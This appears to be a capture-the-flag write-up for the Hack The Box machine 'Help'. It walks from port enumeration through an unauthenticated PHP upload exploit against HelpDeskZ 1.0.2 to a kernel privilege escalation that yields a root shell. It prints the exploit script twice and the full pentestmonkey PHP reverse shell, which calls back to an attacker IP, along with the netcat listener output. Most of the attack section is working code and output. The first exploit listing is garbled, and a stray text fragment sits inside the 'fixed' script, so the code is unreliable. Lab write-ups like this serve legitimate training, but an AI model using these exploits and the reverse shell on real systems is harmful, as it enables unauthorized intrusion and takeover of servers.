---
layout: article
title: Hack the Box - Help
permalink: /ctfs/htb-help
key: page-aside
aside:
  toc: true
---

Quick write-up of Hack The Box: Help

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>


## Enumeration


We start off with an aggressive nmap scan of all ports. 

<img src="/assets/images/ctfs/htb-help/nmap.png" alt="" class="center" alt="" class="center">

We notice an Apache HTTP server on port 80, so we run <b>gobuster</b> against the web server.

```bash
root@kali:~# gobuster -u http://10.10.10.121 -w /usr/share/dirb/wordlists/common.txt -s '200,204,301,302,307,401,403,500'

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/common.txt
[+] Status codes : 200,204,301,302,307,401,403,500
[+] Timeout      : 10s
=====================================================
2019/06/12 23:06:29 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/12 23:07:00 Finished
=====================================================
```

Via the <b>/support</b> directory, we find <b>HelpDeskZ</b>.

<img src="/assets/images/ctfs/htb-help/helpdeskz.png" alt="" class="center" alt="" class="center">


## User Shell

Running <b>HelpDeskZ</b> through <b>searchsploit</b> reveals a file upload vulnerability in the latest release. The details can be seen below.

<img src="/assets/images/ctfs/htb-help/searchsploit.png" alt="" class="center" alt="" class="center">

```bash
root@kali:~# searchsploit -x exploits/php/webapps/40300.py
```
<b>40300.py</b>
```py
'''
#
# Updated Exploit Provided by Drew Griess
#
# Exploit Title HelpDeskZ = v1.0.2 - Unauthenticated Shell Upload
# Google Dork intextHelp Desk Software by HelpDeskZ
# Date 2016-08-26
# Exploit Author Lars Morgenroth - @krankoPwnz
# Vendor Homepage httpwww.helpdeskz.com
# Software Link httpsgithub.comevolutionscriptHelpDeskZ-1.0archivemaster.zip
# Version = v1.0.2
# Tested on
# CVE

HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.

The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file

controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141
$filename = md5($_FILES['attachment']['name'].time())...$ext;

So by guessing the time the file was uploaded, we can get RCE.

Steps to reproduce

httplocalhosthelpdeskzv=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php
'''
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv)  3
    print Usage {} [baseUrl] [nameOfUploadedFile].format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], %a, %d %b %Y %H%M%S %Z) - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300)
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200
        print found!
        print url
        sys.exit(0)

print Sorry, I did not find anything


```

A couple of problems face us right away. It seems as though the script is incomplete. In addition, we find through <b>BurpSuite</b> that the server time, whose accuracy the exploit depends on, is not aligned with our system's time. We can see this if we examine the <b>Date</b> field in an HTTP response.

<img src="/assets/images/ctfs/htb-help/burp-response.png" alt="" class="center" alt="" class="center">

To fix our issue, we need to use the Python <b>requests</b> library to get the server's time from the Date field in an HTTP <b>response</b>. We can then convert the time format using <a href="http://strftime.org/" target="_blank">http://strftime.org/</a> as a guideline. We'll then replace the <b>currentTime</b> variable in the exploit with our converted time. Our final exploit looks like the script below.

```py
import hashlib
import time, calendar
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) <  3:
    print("Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0]))
    sys.exit(1)
e was uploaded, we can get RCE.

Steps to reproduce

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.head("http://10.10.10.121/support/")

# Gets the current time of the server to prevent timezone errors - DoctorEw
currentTime = int(calendar.timegm(time.strptime(r.headers['date'], "%a, %d %b %Y %H:%M:%S %Z")))

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")
```

Checking the <b>HelpDeskZ</b> GitHub, we can make an educated guess that the directory of ticket uploads will be at <b>/uploads/tickets/</b>
<img src="/assets/images/ctfs/htb-help/burp-response.png" alt="" class="center" alt="" class="center">.


If we go to <b>Submit a Ticket</b>, we can upload the infamous pentestmonkey PHP reverse shell.


```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.XX.XXX';  // CHANGE THIS
$port = 8888;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

If we listen on port 8888 and run the exploit, we receive a reverse shell.

```py
root@kali:~/htb/help# python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
```

```bash
root@kali:~# nc -lvp 8888
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.121.
Ncat: Connection from 10.10.10.121:48684.
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 21:22:28 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
help
$ id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
$

```

## Root Shell

We can run <b>uname</b> to get kernel information. It turns out that the kernel is vulnerable to a local privilege escalation according to 
<a href="https://www.exploit-db.com/exploits/44298" target="_blank">https://www.exploit-db.com/exploits/44298</a>.

```bash
help@help:/home/help$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

We can copy and paste the exploit into <b>help-pe.c</b>, compile, and run with the following commands.

```bash
help@help:/home/help$ gcc help-pe.c -o help-pe
help@help:/home/help$ ./help-pe
task_struct = ffff88003699aa00
uidptr = ffff880037018784
spawning root shell
root@help:/home/help# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
```
